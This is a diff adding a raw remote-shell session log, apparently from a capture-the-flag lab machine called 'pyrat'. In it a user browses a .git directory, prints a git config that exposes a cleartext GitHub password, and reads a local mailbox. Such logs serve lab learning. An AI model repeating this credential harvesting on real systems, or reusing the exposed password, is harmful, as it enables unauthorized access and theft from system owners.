@@ -1,0 +1,47 @@
+python shell_access.py                                                                                   ─╯
+Connected to 10.10.135.161:8000
+Type 'exit' to quit.
+PyShell at / > cd /opt
+Changed directory to: /opt
+PyShell at /opt > ls
+dev
+PyShell at /opt > cd dev
+Changed directory to: /opt/dev
+PyShell at /opt/dev > ls
+.git
+PyShell at /opt/dev > cd .git
+Changed directory to: /opt/dev/.git
+PyShell at /opt/dev/.git > ls
+objects COMMIT_EDITMSG HEAD description hooks config info logs branches refs index
+PyShell at /opt/dev/.git > cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[user]
+        name = Jose Mario
+        email = josemlwdf@github.com
+
+[credential]
+        helper = cache --timeout=3600
+
+[credential "https://github.com"]
+        username = think
+        password = _TH1NKINGPirate$_
+PyShell at /opt/dev/.git > cat /var/mail/think  
+From root@pyrat  Thu Jun 15 09:08:55 2023
+Return-Path: <root@pyrat>
+X-Original-To: think@pyrat
+Delivered-To: think@pyrat
+Received: by pyrat.localdomain (Postfix, from userid 0)
+        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+Subject: Hello
+To: <think@pyrat>
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
+Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+From: Dbile Admen <root@pyrat>
+
+Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
+PyShell at /opt/dev/.git > 
